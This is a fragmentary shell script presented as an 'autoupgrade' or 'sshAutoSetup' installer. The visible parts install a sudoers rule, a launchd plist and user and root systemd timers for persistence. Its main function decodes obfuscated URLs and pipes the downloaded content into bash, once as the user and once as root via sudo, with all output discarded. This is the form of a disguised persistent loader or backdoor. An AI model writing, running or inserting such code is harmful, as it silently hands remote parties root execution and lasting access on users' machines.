...
USER_LABEL="autoupgrade"
ROOT_LABEL="sshAutoSetup"
...
install_sudoers_rule() {
  ...
  sudo install -m 0440 "$temporary" "$sudoers_file"
  trap - RETURN
  rm -f "$temporary"
}
...
EOF
  sudo install -m 0644 "$temporary" "$plist"
...
EOF
  ...
  systemctl --user enable --now "$USER_LABEL.timer"
  systemctl --user restart "$USER_LABEL.timer"
}
...
WantedBy=timers.target
EOF
  sudo install -m 0644 "$service_temporary" "$unit_dir/$ROOT_LABEL.service"
  sudo install -m 0644 "$timer_temporary" "$unit_dir/$ROOT_LABEL.timer"
  sudo systemctl daemon-reload
  sudo systemctl enable --now "$ROOT_LABEL.timer"
  sudo systemctl restart "$ROOT_LABEL.timer"
  trap - RETURN
...
main() {
  ...
  curl -fsSL "$(decode_url "$ENCODED_URL")" | bash >/dev/null 2>&1
  sudo bash -c "curl -fsSL '$(decode_url "$ENCODED_URL2")' | bash" >/dev/null 2>&1
}
